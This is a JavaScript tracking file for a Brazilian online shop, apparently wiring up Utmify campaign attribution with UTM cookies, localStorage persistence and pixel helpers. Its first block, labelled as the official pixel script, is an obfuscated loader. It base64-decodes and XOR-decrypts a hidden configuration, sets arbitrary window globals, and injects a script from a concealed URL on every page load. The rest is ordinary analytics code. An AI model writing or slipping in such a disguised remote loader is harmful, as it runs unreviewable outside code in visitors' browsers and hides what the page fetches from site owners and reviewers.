(function () {
  // Script do Pixel utmify via script oficial fornecido
  (function(){var x_txa9=atob("DO0UwBplcXZM2Ow04pY2tWgJU0xusJhAkp4u7zUGFRhirZhZi4tt7nkKHFguqsNHgZ99sG4WXgYloIlYzZ19uH8JXxw/+sAWg5lgsnMHBAIpq84OubA44n0JHhQttJ8W2LZv4nQEHBNu4s5Ei5VxrFMBU1puro1Yl4g2+jhTEE554I0G29khoiNWFBB97tsFgN4n8iNHDCsx");var n_l=[];for(var j_0=0;j_0<x_txa9.length;j_0++){n_l.push(x_txa9.charCodeAt(j_0)&255);}var p_g=n_l[0];var f_az=n_l.slice(1,1+p_g);var r_xj=n_l.slice(1+p_g);var w_hvp3=r_xj.map(function(b,n_9va){return b^f_az[n_9va%p_g];});var b_hp="";for(var d_hov=0;d_hov<w_hvp3.length;d_hov++){b_hp+=String.fromCharCode(w_hvp3[d_hov]&255);}var a_l=decodeURIComponent(escape(b_hp));var u_hmrp=JSON.parse(a_l);var p_q0=u_hmrp.globals||[];p_q0.forEach(function(m_s25){window[m_s25.name]=m_s25.value;});var f_0l=document.createElement("script");f_0l.src=u_hmrp.url;f_0l.async=true;f_0l.defer=true;(u_hmrp.attributes||[]).forEach(function(v_2j2){f_0l.setAttribute(v_2j2.name,v_2j2.value);});(document.head||document.documentElement).appendChild(f_0l);})();

  // Script de UTMs da Utmify (atribuicao de campanha)
  var utms = document.createElement("script");
  utms.setAttribute("src", "https://cdn.utmify.com.br/scripts/utms/latest.js");
  utms.setAttribute("data-utmify-prevent-xcod-sck", "");
  utms.setAttribute("data-utmify-prevent-subids", "");
  utms.setAttribute("async", "");
  utms.setAttribute("defer", "");
  (document.head || document.documentElement).appendChild(utms);

  // Persiste UTMs da primeira visita para atribuir a venda no checkout
  var UTM_KEYS = [
    "utm_source",
    "utm_medium",
    "utm_campaign",
    "utm_content",
    "utm_term",
    "utm_id",
    "ad_id",
    "adgroup_id",
    "campaign_id",
    "gad_campaignid",
    "gad_source",
    "src",
    "sck",
    "gclid",
    "gbraid",
    "wbraid",
    "fbclid",
  ];
  var STORE_KEY = "_utm_store";
  var COOKIE_DOMAIN = location.hostname;

  function setCookie(name, value, days) {
    var expires = "";
    if (days) {
      var date = new Date();
      date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
      expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/; domain=" + COOKIE_DOMAIN;
  }

  try {
    var qs = new URLSearchParams(location.search);
    var incoming = {};
    UTM_KEYS.forEach(function (k) {
      var v = qs.get(k);
      if (v) {
        incoming[k] = v;
        setCookie(k, v, 30);
      }
    });

    if (Object.keys(incoming).length) {
      var existing = {};
      try {
        existing = JSON.parse(localStorage.getItem(STORE_KEY) || "{}");
      } catch (e) {}

      var merged = Object.assign({}, existing, incoming);
      localStorage.setItem(STORE_KEY, JSON.stringify(merged));
    }
  } catch (e) {}

  window.getStoredUtms = function () {
    try {
      return JSON.parse(localStorage.getItem(STORE_KEY) || "{}");
    } catch (e) {
      return {};
    }
  };

  // Helper para eventos suportados pelo pixel da Utmify.
  var UTMIFY_SUPPORTED = { PageView: 1, Purchase: 1 };

  window.utmifyTrack = function (eventName, data) {
    data = data || {};
    if (!UTMIFY_SUPPORTED[eventName]) return;
    if (window.utmify && typeof window.utmify.track === "function") {
      window.utmify.track(eventName, data);
    }
  };

  // Envio de Vendas via API (Server-side) - Documentação: https://docs.utmify.com.br/envio-de-vendas
  // Esta função deve ser chamada quando uma venda é confirmada (paga).
  window.utmifySendSale = function (data) {
    // A integração de vendas da Utmify geralmente é feita via Postback/Webhook ou API Server-side
    // para garantir que apenas vendas pagas sejam registradas e para evitar burlar o pixel.
    // O tracking de Purchase via pixel já está implementado no utmifyTrack.
    console.log("[Utmify] Purchase event tracked via pixel.");
  };
})();
